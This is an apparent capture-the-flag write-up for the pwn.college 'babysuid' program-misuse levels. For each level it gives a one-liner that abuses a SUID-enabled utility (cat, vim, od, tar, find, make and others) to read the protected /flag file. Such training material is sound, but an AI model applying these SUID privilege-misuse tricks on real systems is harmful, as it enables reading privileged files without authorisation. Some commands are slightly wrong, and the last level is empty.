# Fundamentals 

Most of these challenges can be solved with one liners, thus I will showcase the solutions below. I will not go into much details, the program runs the given commands with `SUID`. The purpose is for players to understand how the commands work. To getter a better understanding of each command, run on command line `man func_name`, e.g. `man cat`.

<center>
    <h1>
      	Commands to read the context of a file
    </h1> 
</center>

### Level 1 - cat

When we run the challenge, we get the following message: 

```bash 
hacker@program-misuse~level1:/$ ./challenge/babysuid_level1
Welcome to ./challenge/babysuid_level1!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/cat.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./challenge/babysuid_level1) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cat!
```

As the challenge says, when we run it, it sets it `SUID` bit on `/usr/bin/cat`, meaning we can run `cat` as privileged user. After we run the program, we can use `cat` to read the `flag`.

```bash
$ ./challenge/babysuid_level1 2&>/dev/null && cat flag
```

### Level 2 - more

We will use the same technique as before.

```bash
$ ./babysuid_level2 2&>/dev/null && /usr/bin/more /flag
```

### Level 3 - less

Same as before.

```bash
$ ./babysuid_level3 2&>/dev/null && /usr/bin/more /flag
```

### Level 4 - tail

Same as before.

```bash
$ ./babysuid_level4 2&>/dev/null && /usr/bin/tail /flag
```

### Level 5 - head

```bash
$ ./babysuid_level5 2&>/dev/null && /usr/bin/head /flag
```

<center>
    <h1>
      	Editors  
    </h1> 
</center>

### Level 6 - sort

```bash
$ ./babysuid_level6 2&>/dev/null && /usr/bin/sort /flag
```

The following levels demonstrate how to open a file via some editors.

### Level 7 - vim

Run `vim /flag` to get the flag.

### Level 8 - emacs

```bash
$ emacs /flag
```

### Level 9 - nano

```bash
$ nano /flag
```

<center>
    <h1>
      	Analyze the output of the commands 
    </h1> 
</center>

### Level 10 - rev

From the `man` page of `rev`. 

>     The rev utility copies the specified files to standard output, reversing the order of characters in every line. If no files are specified, standard input is read.

To get the output in the correct order, we `pipe` the output of the rev command to another rev command. 

```bash
$ rev /flag | rev
```

### Level 11 - od

This command dumps files in `octal` and other formats.

```bash
$ od -A n -t x1 /flag | awk '{$1=$1; print}' | sed 's/ //g' | xxd -r -p
```

Let me explain the components:

- `od -A n -t x1 /flag`: This command dumps the contents of `/flag` in hexadecimal format, one byte per line.
- `awk '{$1=$1; print}'`: This command removes leading whitespaces that `od` might introduce in the output.
- `sed 's/ //g'`: This command removes any spaces between the hex bytes.
- `xxd -r -p`: This command converts the resulting stream of hex bytes back into binary, then the binary is interpreted as ASCII characters.

### Level 12 - hd

This command displays file contents in `hexadecimal`, `decimal`, `octal`, or `ascii`.

```bash
$ hd /flag
00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 49 6c 67 4a  |pwn.college{IlgJ|
00000010  6c 67 67 6e 6f 41 50 57  48 6c 48 6e 6e 79 2d 42  |lggnoAPWHlHnny-B|
00000020  43 5f 39 43 53 53 6d 2e  51 58 30 55 54 4d 73 4d  |C_9CSSm.QX0UTMsM|
00000030  44 4e 33 49 7a 57 7d 0a                           |DN3IzW}.|
00000038
```

### Level 13 - xxd

This command makes a `hexdump` or do the reverse.

```bash
$ xxd /flag
00000000: 7077 6e2e 636f 6c6c 6567 657b 674c 7866  pwn.college{gLxf
00000010: 3364 3043 654f 4342 5564 5574 535a 4c77  3d0CeOCBUdUtSZLw
00000020: 5271 4837 5834 312e 5158 3155 544d 734d  RqH7X41.QX1UTMsM
00000030: 444e 3349 7a57 7d0a                      DN3IzW}.
```

### Level 14 - base32

This command `encodes`/`decode` data and prints to standard output.

```bash
$ base32 /flag | base32 -d
```

### Level 15 - base64

Same as before but with different encoding.

```bash
$ base64 /flag | base64 -d
```

### Level 16 - split

From the `man` page of `split`:

> NAME
>        split - split a file into pieces
>
> SYNOPSIS
>        split [OPTION]... [FILE [PREFIX]]
>
> DESCRIPTION
>        Output pieces of FILE to PREFIXaa, PREFIXab, ...; default size is 1000 lines, and default PREFIX is 'x'.

So, it will split the flag to `PREFIXaa` and `PREFIXab`. Reading the content of `xaa` will give us the flag.

```bash
$ split /flag && cat xaa 
```

<center>
    <h1>
      	Archive formats
    </h1> 
</center>

### Level 17 - gzip

From the `man` page of `gzip`:

> -c --stdout --to-stdout
>           Write  output on standard output; keep original files unchanged.  If there are several input files, the output consists of a sequence of independently compressed members. To obtain better compression, concatenate all input files before compressing them.
>
> -d --decompress --uncompress
>           Decompress.

```bash
$ gzip -c /flag | gzip -d
```

### Level 18 - bzip2

From the `man` page of `gzip`.

```bash
$ bzip2 -c /flag | bzip2 -d
```

### Level 19 - zip

```bash
$ zip flag.zip /flag 2&>/dev/null && strings flag.zip | grep pwn
```

### Level 20 - tar

```bash
$ tar -cf flag.tar /flag && strings flag.tar | grep pwn
```

### Level 21 - ar

```bash
$ ar -r flag.a /flag && strings flag.a | grep pwn
```

### Level 22 - cpio

```bash
$ find /flag | cpio -o
```

<center>
    <h1>
      	Execute other commands to read flag
    </h1> 
</center>

### Level 23 - genisoimage

```bash
$ genisoimage -sort /flag | grep pwn
```

### Level 24 - env

From the `man` page of `env`:

> NAME
>        env - run a program in a modified environment

We will use `env` to execute `head` and check the content of /`flag`.

```bash
$ env head /flag 
```

### Level 25 - find

There is a variety of ways for this, from spawning shell, use `head`, `more` or whatever we learned from the first challenges to print the content of `/flag`.

```bash
$ find /flag -exec /usr/bin/cat /flag \;
```

### Level 26 - make

With a bit of bash magic, we can come up with something like this:

```bash
$ make -s -C / -f /dev/null --eval="$(echo -e 'print_flag:\n\t@cat /flag\n') print_flag"
```

### Level 27 - nice

```bash
```





